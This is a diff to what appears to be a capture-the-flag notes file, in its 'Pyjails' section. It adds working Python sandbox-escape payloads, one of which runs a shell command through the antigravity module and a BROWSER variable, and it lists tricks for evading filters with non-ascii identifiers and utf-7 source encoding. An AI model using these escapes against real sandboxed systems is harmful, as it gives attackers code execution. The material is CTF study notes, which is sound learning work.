@@ -102,11 +102,15 @@ constraints:
 - glibc-2.34 - `malloc` hooks removed from the API.
 
 # Pyjails
+Example payloads to reuse:
 ```python
 (__builtins__:=__import__('code'))==(lambda:interact())()
 
 # from https://hackmd.io/@crazyman/H1s0b1Hii
 __import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s')))
 ```
-Tricks:
-- Python translates non-ascii identifiers to ascii: https://peps.python.org/pep-3131/ . Might be useful to avoid some filters.
+Tricks that might be helpful:
+- [https://peps.python.org/pep-3131/](Non-ascii identifiers get
+  translated to ascii ones.)
+- [https://peps.python.org/pep-0263/](You can change the encoding of
+  the file with a comment. Changing to utf-7 is especially useful.)
